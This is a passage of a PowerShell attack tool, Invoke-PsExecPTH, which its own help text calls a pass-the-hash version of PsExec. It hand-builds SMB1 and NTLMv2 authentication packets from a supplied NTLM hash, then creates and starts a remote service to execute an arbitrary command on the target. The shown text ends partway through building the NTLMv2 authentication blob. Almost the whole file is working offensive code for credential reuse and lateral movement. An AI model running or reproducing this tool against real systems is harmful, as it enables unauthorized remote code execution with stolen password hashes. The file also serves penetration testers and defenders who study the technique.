function Invoke-PsExecPTH
{
<#
.SYNOPSIS
Invoke-PsExecPTH is a pass the hash version of PsExec. This module is currently limited to command exection only over
SMB1 with NTLMv2. This module is still very proof of concept.

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for PsExec authentication. The user must be a local administrator on the target.

.PARAMETER Domain
Domain or hostname to use for PsExec authentication.

.PARAMETER Hash
NTLM password hash for PsExec authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Command
Command to execute on the target.

.EXAMPLE
Invoke-PsExecPTH -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command to execute"

#>
[CmdletBinding()]
param
(
[parameter(Mandatory=$true)][String]$Target,
[parameter(Mandatory=$true)][String]$Username,
[parameter(Mandatory=$true)][String]$Domain,
[parameter(Mandatory=$true)][String]$Command,
[parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash
)

function Set-PacketSMBNegotiateProtocolRequest()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID)

    [Byte[]]$packet_SMB_negotiate_protocol_request = 0x00,
                                                        0x00,0x00,0x2f,
                                                        0xff,0x53,0x4d,0x42,
                                                        0x72,
                                                        0x00,0x00,0x00,0x00,
                                                        0x18,
                                                        0x01,0x48,
                                                        0x00,0x00,
                                                        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                        0x00,0x00,
                                                        0xff,0xff +
                                                        $packet_process_ID +
                                                        $packet_user_ID +
                                                        $packet_multiplex_ID +
                                                        0x00,
                                                        0x0c,0x00,
                                                        0x02,
                                                        0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00

    return $packet_SMB_negotiate_protocol_request
}

function Set-PacketSMBSMBSessionSetupAndXRequestNTLMSSPNegotiate()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID,
    [Byte[]]$packet_security_blob_length,[Byte[]]$packet_byte_count,[Byte[]]$packet_length_1,
    [Byte[]]$packet_length_2,[Byte[]]$packet_length_3,[Byte[]]$packet_NTLMSSP_length,[Byte[]]$packet_NTLMSSP)

    if(!$packet_NTLMSSP)
    {
        
        [Byte[]]$packet_security_blob_length = 0x4a,0x00

        [Byte[]]$packet_byte_count = 0x4f,0x00

        [Byte[]]$packet_length_1 = 0x48

        [Byte[]]$packet_length_2 = 0x3e

        [Byte[]]$packet_length_3 = 0x2a

        [Byte[]]$packet_NTLMSSP_length = 0x28

        [Byte[]]$packet_NTLMSSP = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x01,0x00,0x00,0x00,
                                    0x07,0x82,0x08,0xa2,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x06,
                                    0x03,
                                    0x80,0x25,
                                    0x00,0x00,0x00,
                                    0x0f
    }

    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length + 98)
    $packet_netbios_session_service_length = $packet_netbios_session_service_length[2..0]
        
    [Byte[]]$packet_SMB_session_setup_andx_request_NTLMSSP_negotiate = [Array]0x00 +
                                                                        $packet_netbios_session_service_length +
                                                                        0xff,0x53,0x4d,0x42,
                                                                        0x73,
                                                                        0x00,0x00,0x00,0x00,
                                                                        0x18,
                                                                        0x07,0xc8,
                                                                        0x00,0x00,
                                                                        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                        0x00,0x00,
                                                                        0xff,0xff + #26
                                                                        $packet_process_ID +
                                                                        $packet_user_ID +
                                                                        $packet_multiplex_ID +
                                                                        0x0c,
                                                                        0xff,
                                                                        0x00,
                                                                        0x00,0x00,
                                                                        0xff,0xff,
                                                                        0x02,0x00,
                                                                        0x01,0x00,
                                                                        0x00,0x00,0x00,0x00 + #47
                                                                        $packet_security_blob_length +
                                                                        0x00,0x00,0x00,0x00,
                                                                        0x44,0x00,0x00,0x80 +
                                                                        $packet_byte_count +
                                                                        0x60 + #60
                                                                        $packet_length_1 +
                                                                        0x06,0x06,
                                                                        0x2b,0x06,0x01,0x05,0x05,0x02,
                                                                        0xa0 + # check
                                                                        $packet_length_2 +
                                                                        0x30,0x3c,0xa0,0x0e,0x30,0x0c,
                                                                        0x06,0x0a,
                                                                        0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,
                                                                        0xa2 +
                                                                        $packet_length_3 +
                                                                        0x04 +
                                                                        $packet_NTLMSSP_length +
                                                                        $packet_NTLMSSP +
                                                                        0x00,
                                                                        0x00,0x00,
                                                                        0x00,0x00
    
    return $packet_SMB_session_setup_andx_request_NTLMSSP_negotiate
}

function Set-PacketSMBSessionSetupAndXRequestNTLMSSPAuth()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID,
    [Byte[]]$packet_security_blob_length,[Byte[]]$packet_byte_count,[Byte[]]$packet_length_1,
    [Byte[]]$packet_length_2,[Byte[]]$packet_length_3,[Byte[]]$packet_NTLMSSP_length,[Byte[]]$packet_NTLMSSP)

    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length + 80)
    $packet_netbios_session_service_length = $packet_netbios_session_service_length[2..0]
    
    [Byte[]]$packet_SMB_session_setup_andx_request_NTLMSSP_auth = [Array]0x00 +
                                                                    $packet_netbios_session_service_length +
                                                                    0xff,0x53,0x4d,0x42,
                                                                    0x73,
                                                                    0x00,0x00,0x00,0x00,
                                                                    0x18,
                                                                    0x07,0xc8,
                                                                    0x00,0x00,
                                                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                    0x00,0x00,
                                                                    0xff,0xff +
                                                                    $packet_process_ID +
                                                                    $packet_user_ID +
                                                                    $packet_multiplex_ID +
                                                                    0x0c,
                                                                    0xff,
                                                                    0x00,
                                                                    0x00,0x00,
                                                                    0xff,0xff,
                                                                    0x02,0x00,
                                                                    0x01,0x00,
                                                                    0x00,0x00,0x00,0x00 +
                                                                    $packet_security_blob_length +
                                                                    0x00,0x00,0x00,0x00,
                                                                    0x44,0x00,0x00,0x80 +
                                                                    $packet_byte_count +
                                                                    0xa1,0x82 +
                                                                    $packet_length_1 +
                                                                    0x30,0x82 +
                                                                    $packet_length_2 +
                                                                    0xa2,0x82 +
                                                                    $packet_length_3 +
                                                                    0x04,0x82 +
                                                                    $packet_NTLMSSP_length +
                                                                    $packet_NTLMSSP +
                                                                    0x00,
                                                                    0x00,0x00,
                                                                    0x00,0x00

    return $packet_SMB_session_setup_andx_request_NTLMSSP_auth
}

function Set-PacketSMBTreeConnectAndXRequest()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID,[Byte[]]$packet_byte_count,
    [Byte[]]$packet_path)

    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_path.Length + 50)
    $packet_netbios_session_service_length = $packet_netbios_session_service_length[2..0]

    [Byte[]]$packet_SMB_tree_connect_andx_request = [Array]0x00 +
                                                    $packet_netbios_session_service_length +
                                                    0xff,0x53,0x4d,0x42,
                                                    0x75,
                                                    0x00,0x00,0x00,0x00,
                                                    0x18,
                                                    0x01,0x48,
                                                    0x00,0x00,
                                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                    0x00,0x00,
                                                    0xff,0xff +
                                                    $packet_process_ID +
                                                    $packet_user_ID +
                                                    $packet_multiplex_ID +
                                                    0x04, # set?
                                                    0xff,
                                                    0x00,
                                                    0x00,0x00,
                                                    0x00,0x00,
                                                    0x01,0x00 +
                                                    $packet_byte_count +
                                                    0x00 +
                                                    $packet_path +
                                                    0x3f,0x3f,0x3f,0x3f,0x3f,0x00

    return $packet_SMB_tree_connect_andx_request
}

function Set-PacketSMBNTCreateAndXRequest()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID,
    [Byte[]]$packet_byte_count,[Byte[]]$pack_named_pipe)

    [Byte[]]$packet_SMB_NT_create_andx_request = 0x00,
                                                    0x00,0x00,0x5b,
                                                    0xff,0x53,0x4d,0x42,
                                                    0xa2,
                                                    0x00,
                                                    0x00,
                                                    0x00,0x00,
                                                    0x18,
                                                    0x02,0x28,
                                                    0x00,0x00,
                                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                    0x00,0x00,
                                                    0x00,0x08 +
                                                    $packet_process_ID +
                                                    $packet_user_ID +
                                                    $packet_multiplex_ID +
                                                    0x18,
                                                    0xff,
                                                    0x00,
                                                    0x00,0x00,
                                                    0x00,
                                                    0x07,0x00, # set?
                                                    0x16,0x00,0x00,0x00,
                                                    0x00,0x00,0x00,0x00,
                                                    0x00,0x00,0x00,0x02,
                                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                    0x00,0x00,0x00,0x00,
                                                    0x07,0x00,0x00,0x00,
                                                    0x01,0x00,0x00,0x00,
                                                    0x00,0x00,0x00,0x00,
                                                    0x02,0x00,0x00,0x00,
                                                    0x00 +
                                                    $packet_byte_count +
                                                    $pack_named_pipe

    return $packet_SMB_NT_create_andx_request
}

function Set-PacketSMBNTReadAndXRequest()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID)

    [Byte[]]$packet_SMB_NT_read_andx_request = 0x00,
                                                0x00,0x00,0x37,
                                                0xff,0x53,0x4d,0x42,
                                                0x2e,
                                                0x00,
                                                0x00,
                                                0x00,0x00,
                                                0x18,
                                                0x05,0x28,
                                                0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,
                                                0x00,0x08 +
                                                $packet_process_ID +
                                                $packet_user_ID +
                                                $packet_multiplex_ID +
                                                0x0a,
                                                0xff,
                                                0x00,
                                                0x00,0x00,
                                                0x00,0x40,
                                                0x00,0x00,0x00,0x00,
                                                0x58,0x02,
                                                0x58,0x02,
                                                0xff,0xff,0xff,0xff,
                                                0x00,0x00,
                                                0x00,0x00

    return $packet_SMB_NT_read_andx_request
}

function Set-PacketDCERPCBind()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID)

    [Byte[]]$packet_DCERPC_bind = 0x00,
                                    0x00,0x00,0x87,
                                    0xff,0x53,0x4d,0x42,
                                    0x2f,
                                    0x00,
                                    0x00,
                                    0x00,0x00,
                                    0x18,
                                    0x05,0x28,
                                    0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,
                                    0x00,0x08 +
                                    $packet_process_ID +
                                    $packet_user_ID +
                                    $packet_multiplex_ID +
                                    0x0e,
                                    0xff,
                                    0x00,
                                    0x00,0x00,
                                    0x00,0x40,
                                    0xea,0x03,0x00,0x00,
                                    0xff,0xff,0xff,0xff,
                                    0x08,0x00,
                                    0x48,0x00,
                                    0x00,0x00,
                                    0x48,0x00,
                                    0x3f,0x00,
                                    0x00,0x00,0x00,0x00,
                                    0x48,0x00,
                                    0x05,
                                    0x00,
                                    0x0b,
                                    0x03,
                                    0x10,0x00,0x00,0x00,
                                    0x48,0x00,
                                    0x00,0x00,
                                    0x00,0x00,0x00,0x00,
                                    0xd0,0x16,
                                    0xd0,0x16,
                                    0x00,0x00,0x00,0x00,
                                    0x01,
                                    0x00,0x00,0x00,
                                    0x00,0x00,
                                    0x01,
                                    0x00,
                                    0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03, # set
                                    0x02,0x00,
                                    0x00,0x00,
                                    0x04,0x5d,0x88,0x8a,0xeb,0x1c,
                                    0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,
                                    0x02,0x00,0x00,0x00

    return $packet_DCERPC_bind
}

function Set-PacketSMBOpenSCManagerW()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID,[Byte[]]$packet_service)

    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_service.Length + 113)
    $packet_netbios_session_service_length = $packet_netbios_session_service_length[2..0]

    [Byte[]]$packet_SMB_open_SC_manager = [Array]0x00 +
                                            $packet_netbios_session_service_length +
                                            0xff,0x53,0x4d,0x42,
                                            0x2f,
                                            0x00,
                                            0x00,
                                            0x00,0x00,
                                            0x18,
                                            0x05,0x28,
                                            0x00,0x00,
                                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                            0x00,0x00,
                                            0x00,0x08 +
                                            $packet_process_ID +
                                            $packet_user_ID +
                                            $packet_multiplex_ID +
                                            0x0e,
                                            0xff,
                                            0x00,
                                            0x00,0x00,
                                            0x00,0x40,
                                            0xea,0x03,0x00,0x00,
                                            0xff,0xff,0xff,0xff,
                                            0x08,0x00,
                                            0x50,0x00,
                                            0x00,0x00,
                                            0x5c,0x00,
                                            0x3f,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x5c,0x00,
                                            0x05,
                                            0x00,
                                            0x00,
                                            0x03,
                                            0x10,0x00,0x00,0x00,
                                            0x5c,0x00,
                                            0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x38,0x00,0x00,0x00,
                                            0x00,0x00,
                                            0x0f,0x00,
                                            0x00,0x00,0x03,0x00,
                                            0x15,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x15,0x00,0x00,0x00 +
                                            $packet_service +
                                            0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x3f,0x00,0x0f,0x00

    return $packet_SMB_open_SC_manager
}

function Set-PacketSMBCreateServiceW()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID,
    [Byte[]]$packet_service_byte_count,[Byte[]]$packet_context_handle,[Byte[]]$packet_service,
    [Byte[]]$packet_referent_ID,[Byte[]]$packet_command_length,[Byte[]]$packet_command)
                
    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_service.Length + $packet_command.Length + 237)
    $packet_netbios_session_service_length = $packet_netbios_session_service_length[2..0]

    [Byte[]]$packet_SMB_create_service_w = [Array]0x00 +
                                            $packet_netbios_session_service_length +
                                            0xff,0x53,0x4d,0x42,
                                            0x2f,
                                            0x00,
                                            0x00,
                                            0x00,0x00,
                                            0x18,
                                            0x05,0x28,
                                            0x00,0x00,
                                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                            0x00,0x00,
                                            0x00,0x08 +
                                            $packet_process_ID +
                                            $packet_user_ID +
                                            $packet_multiplex_ID +
                                            0x0e,
                                            0xff,
                                            0x00,
                                            0x00,0x00,
                                            0x00,0x40,
                                            0x00,0x00,0x00,0x00,
                                            0xff,0xff,0xff,0xff,
                                            0x08,0x00 +
                                            $packet_service_byte_count +
                                            0x00,0x00 +
                                            $packet_service_byte_count +
                                            0x3f,0x00,
                                            0x00,0x00,0x00,0x00 +
                                            $packet_service_byte_count +
                                            0x05,
                                            0x00,
                                            0x00,
                                            0x03,
                                            0x10,0x00,0x00,0x00 +
                                            $packet_service_byte_count +
                                            0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x00,0x00,
                                            0x0c,0x00 +
                                            $packet_context_handle +
                                            0x15,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x15,0x00,0x00,0x00 +
                                            $packet_service +
                                            0x00,0x00 +
                                            $packet_referent_ID +
                                            0x15,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x15,0x00,0x00,0x00 +
                                            $packet_service +
                                            0x00,0x00,
                                            0xff,0x01,0x0f,0x00,
                                            0x10,0x01,0x00,0x00,
                                            0x03,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00 +
                                            $packet_command_length +
                                            0x00,0x00,0x00,0x00 +
                                            $packet_command_length +
                                            $packet_command +
                                            0x00,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x00,0x00,0x00,0x00

    return $packet_SMB_create_service_w
}

function Set-PacketSMBStartServiceW()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID,
    [Byte[]]$packet_context_handle)

    [Byte[]]$packet_SMB_start_service_w = 0x00,
                                            0x00,0x00,0x73,
                                            0xff,0x53,0x4d,0x42,
                                            0x2f,
                                            0x00,
                                            0x00,
                                            0x00,0x00,
                                            0x18,
                                            0x05,0x28,
                                            0x00,0x00,
                                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                            0x00,0x00,
                                            0x00,0x08 +
                                            $packet_process_ID +
                                            $packet_user_ID +
                                            $packet_multiplex_ID +
                                            0x0e,
                                            0xff,
                                            0x00,
                                            0x00,0x00,
                                            0x00,0x40,
                                            0x00,0x00,0x00,0x00,
                                            0xff,0xff,0xff,0xff,
                                            0x08,0x00,
                                            0x34,0x00,
                                            0x00,0x00,
                                            0x34,0x00,
                                            0x3f,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x34,0x00,
                                            0x05,
                                            0x00,
                                            0x00,
                                            0x03,
                                            0x10,0x00,0x00,0x00,
                                            0x34,0x00,
                                            0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x1c,0x00,0x00,0x00,
                                            0x00,0x00,
                                            0x13,0x00 +
                                            $packet_context_handle +
                                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

    return $packet_SMB_start_service_w
}

function Set-PacketSMBDeleteServiceW()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID,
    [Byte[]]$packet_context_handle)

    [Byte[]]$packet_SMB_delete_service_w = 0x00,
                                            0x00,0x00,0x6b,
                                            0xff,0x53,0x4d,0x42,
                                            0x2f,
                                            0x00,
                                            0x00,
                                            0x00,0x00,
                                            0x18,
                                            0x05,0x28,
                                            0x00,0x00,
                                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                            0x00,0x00,
                                            0x00,0x08 +
                                            $packet_process_ID +
                                            $packet_user_ID +
                                            $packet_multiplex_ID +
                                            0x0e,
                                            0xff,
                                            0x00,
                                            0x00,0x00,
                                            0x00,0x40,
                                            0x0b,0x01,0x00,0x00,
                                            0xff,0xff,0xff,0xff,
                                            0x08,0x00,
                                            0x2c,0x00,
                                            0x00,0x00,
                                            0x2c,0x00,
                                            0x3f,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x2c,0x00,
                                            0x05,
                                            0x00,
                                            0x00,
                                            0x03,
                                            0x10,0x00,0x00,0x00,
                                            0x2c,0x00,
                                            0x00,0x00,
                                            0x00,0x00,0x00,0x00,
                                            0x14,0x00,0x00,0x00,
                                            0x00,0x00,
                                            0x02,0x00 +
                                            $packet_context_handle

    return $packet_SMB_delete_service_w
}

function Set-PacketSMBCloseServiceHandle()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID,
    [Byte[]]$packet_context_handle)

    [Byte[]]$packet_SMB_close_service_handle = 0x00,
                                                0x00,0x00,0x80,
                                                0xff,0x53,0x4d,0x42,
                                                0x25,
                                                0x00,0x00,0x00,0x00,
                                                0x18,
                                                0x07,0xc8,
                                                0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,
                                                0x00,0x08 +
                                                $packet_process_ID +
                                                $packet_user_ID +
                                                $packet_multiplex_ID +
                                                0x10,
                                                0x00,0x00,
                                                0x2c,0x00,
                                                0x00,0x00,
                                                0x00,0x04,
                                                0x00,
                                                0x00,
                                                0x00,0x00,
                                                0x00,0x00,0x00,0x00,
                                                0x00,0x00,
                                                0x00,0x00,
                                                0x54,0x00,
                                                0x2c,0x00,
                                                0x54,0x00,
                                                0x02,
                                                0x00,
                                                0x26,0x00, # check
                                                0x00,0x40, # check
                                                0x3d,0x00, # byte count
                                                0x00,
                                                0x5c,0x00,0x50,0x00,0x49,0x00,0x50,0x00,0x45,0x00,0x5c,0x00,0x00,0x00, # pipe
                                                0x00,0x00,
                                                0x05,
                                                0x00,
                                                0x00,
                                                0x03,
                                                0x10,0x00,0x00,0x00,
                                                0x2c,0x00,
                                                0x00,0x00,
                                                0x08,0x00,0x00,0x00,
                                                0x14,0x00,0x00,0x00,
                                                0x00,0x00,
                                                0x00,0x00 +
                                                $packet_context_handle

    return $packet_SMB_close_service_handle
}

function Set-PacketSMBCloseRequest()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID)

    [Byte[]]$packet_SMB_close_request = 0x00,
                                            0x00,0x00,0x29,
                                            0xff,0x53,0x4d,0x42,
                                            0x04,
                                            0x00,0x00,0x00,0x00,
                                            0x18,
                                            0x07,0xc8,
                                            0x00,0x00,
                                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                            0x00,0x00,
                                            0x00,0x08 +
                                            $packet_process_ID +
                                            $packet_user_ID +
                                            $packet_multiplex_ID +
                                            0x03,
                                            0x00,0x40,
                                            0xff,0xff,0xff,0xff,
                                            0x00,0x00

    return $packet_SMB_close_request
}

function Set-PacketSMBTreeDisconnectRequest()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID)

    [Byte[]]$packet_SMB_tree_disconnect_request = 0x00,
                                                    0x00,0x00,0x23,
                                                    0xff,0x53,0x4d,0x42,
                                                    0x71,
                                                    0x00,0x00,0x00,0x00,
                                                    0x18,
                                                    0x07,0xc8,
                                                    0x00,0x00,
                                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                    0x00,0x00,
                                                    0x00,0x08 +
                                                    $packet_process_ID +
                                                    $packet_user_ID +
                                                    $packet_multiplex_ID +
                                                    0x00,0x00,0x00

    return $packet_SMB_tree_disconnect_request
}

function Set-PacketSMBLogoffAndXRequest()
{
    param ([Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID,[Byte[]]$packet_multiplex_ID)

    [Byte[]]$packet_SMB_logoff_andx_request = 0x00,
                                                0x00,0x00,0x27,
                                                0xff,0x53,0x4d,0x42,
                                                0x74,
                                                0x00,0x00,0x00,0x00,
                                                0x18,
                                                0x07,0xc8,
                                                0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,
                                                0x34,0xfe +
                                                $packet_process_ID +
                                                $packet_user_ID +
                                                $packet_multiplex_ID +
                                                0x02,
                                                0xff,
                                                0x00,
                                                0x00,0x00,
                                                0x00,0x00

    return $packet_SMB_logoff_andx_request
}

function DataLength2
{
    param ([Int]$length_start,[Byte[]]$string_extract_data)

    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)

    return $string_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
$SMB_client = New-Object System.Net.Sockets.TCPClient

try
{
    $SMB_client.Connect($Target,"445")
}
catch
{
    Write-Output "$Target did not respond"
}

if($SMB_client.Connected)
{
    $SMB_client_stream = $SMB_client.GetStream()
    $SMB_client_receive = New-Object System.Byte[] 1024
    $i = 0

    while($i -lt 2)
    {
        
        switch ($i)
        {

            0
            {
                $SMB_client_send = Set-PacketSMBNegotiateProtocolRequest $process_ID_bytes 0x00,0x00 0x00,0x00
            }
                
            1
            { 
                $SMB_client_send = Set-PacketSMBSMBSessionSetupAndXRequestNTLMSSPNegotiate $process_ID_bytes 0x00,0x00 0x00,0x00
            }
            
        }

        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
        $SMB_client_stream.Flush()    
        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
        $i++
    }

    $SMB_user_ID = $SMB_client_receive[34,33]
    $SMB_NTLMSSP = [System.BitConverter]::ToString($SMB_client_receive)
    $SMB_NTLMSSP = $SMB_NTLMSSP -replace "-",""
    $SMB_NTLMSSP_index = $SMB_NTLMSSP.IndexOf("4E544C4D53535000")
    $SMB_NTLMSSP_bytes_index = $SMB_NTLMSSP_index / 2
    $SMB_domain_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 12) $SMB_client_receive
    $SMB_target_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 40) $SMB_client_receive
    $SMB_NTLM_challenge = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 24)..($SMB_NTLMSSP_bytes_index + 31)]
    $SMB_target_details = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
    $SMB_target_time_bytes = $SMB_target_details[($SMB_target_details.length - 12)..($SMB_target_details.length - 5)]
    $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.length;$i += 2){$hash.SubString($i,2)}}) -join "-"
    $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $auth_hostname = (get-childitem -path env:computername).Value
    $auth_hostname = (&{for ($i = 0;$i -lt $auth_hostname.length;$i += 1){$auth_hostname.SubString($i,1)}}) -join "`0"
    $auth_hostname = $auth_hostname + "`0"
    $auth_domain = $Domain.ToUpper() 
    $auth_domain = (&{for ($i = 0;$i -lt $auth_domain.length;$i += 1){$auth_domain.SubString($i,1)}}) -join "`0"
    $auth_domain = $auth_domain + "`0"
    $auth_username = (&{for ($i = 0;$i -lt $username.length;$i += 1){$username.SubString($i,1)}}) -join "`0"
    $auth_username = $auth_username + "`0"
    $auth_domain_bytes = [Text.Encoding]::UTF8.GetBytes($auth_domain)
    $auth_username_bytes = [Text.Encoding]::UTF8.GetBytes($auth_username)
    $auth_hostname_bytes = [Text.Encoding]::UTF8.GetBytes($auth_hostname)
    $auth_domain_length = [BitConverter]::GetBytes($auth_domain_bytes.Length)
    $auth_domain_length = $auth_domain_length[0,1]
    $auth_domain_length = [BitConverter]::GetBytes($auth_domain_bytes.Length)
    $auth_domain_length = $auth_domain_length[0,1]
    $auth_username_length = [BitConverter]::GetBytes($auth_username_bytes.Length)
    $auth_username_length = $auth_username_length[0,1]
    $auth_hostname_length = [BitConverter]::GetBytes($auth_hostname_bytes.Length)
    $auth_hostname_length = $auth_hostname_length[0,1]
    $auth_domain_offset = 0x58,0x00,0x00,0x00
    $auth_username_offset = [BitConverter]::GetBytes($auth_domain_bytes.Length + 88)
    $auth_hostname_offset = [BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 88)
    $auth_LM_offset = [BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
    $auth_NTLM_offset = [BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 112)
    $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
    $HMAC_MD5.key = $NTLM_hash_bytes
    $username_and_target = $username.ToUpper()
    $username_and_target = (&{for ($i = 0;$i -lt $username_and_target.length;$i += 1){$username_and_target.SubString($i,1)}}) -join "`0"
    $username_and_target = $username_and_target + "`0"
    $username_and_target_bytes = [Text.Encoding]::UTF8.GetBytes($username_and_target)
    $username_and_target_bytes += $auth_domain_bytes
    $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
    $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $security_blob_bytes = 0x01,0x01,0x00,0x00,
                            0x00,0x00,0x00,0x00 +
                            $SMB_target_time_bytes +
                            $client_challenge_bytes +
                            0x00,0x00,0x00,0x00 +
                            $SMB_target_details +
                            0x00,0x00,0x00,0x00 +
                            0x00,0x00,0x00,0x00

    $server_challenge_and_security_blob_bytes = $SMB_NTLM_challenge + $security_blob_bytes
    $HMAC_MD5.key = $NTLMv2_hash
    $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)
    $NTLMv2_MIC = $HMAC_MD5.ComputeHash($NTLMv2_response)
    $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
    $NTLMv2_response_length = [BitConverter]::GetBytes($NTLMv2_response.Length)
    $NTLMv2_response_length = $NTLMv2_response_length[0,1]

    $full_security_blob = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                            0x03,0x00,0x00,0x00,
                            0x18,0x00,
                            0x18,0x00 +
                            $auth_LM_offset +
                            $NTLMv2_response_length +
                            $NTLMv2_response_length +
                            $auth_NTLM_offset +
                            $auth_domain_length +
                            $auth_domain_length +
                            $auth_domain_offset +
                            $auth_username_length +
